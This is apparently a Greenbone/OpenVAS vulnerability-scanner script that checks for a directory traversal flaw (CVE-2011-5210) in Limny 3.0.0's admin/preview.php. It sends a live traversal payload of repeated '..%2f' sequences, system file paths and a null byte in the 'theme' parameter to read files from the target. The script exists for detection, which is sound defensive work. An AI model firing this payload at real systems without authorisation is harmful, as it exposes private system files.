CPE = "cpe:/a:limny:limny";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802984" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2011-5210" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-10-12 15:41:59 +0530 (Fri, 12 Oct 2012)" );
	script_name( "Limny admin/preview.php theme Parameter Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_limny_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "limny/installed" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/43124" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/65083" );
	script_xref( name: "URL", value: "http://www.autosectools.com/Advisories/Limny.3.0.0_Local.File.Inclusion_99.html" );
	script_tag( name: "insight", value: "Input passed via 'theme' parameter to admin/preview.php is not properly
  sanitised before being used to include files." );
	script_tag( name: "solution", value: "Upgrade to Limny version 3.0.1 or later." );
	script_tag( name: "summary", value: "This host is running Limny and is prone to directory traversal vulnerability." );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "Limny version 3.0.0" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://www.limny.org/download" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/admin/preview.php?theme=" + crap( data: "..%2f", length: 3 * 15 ) + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

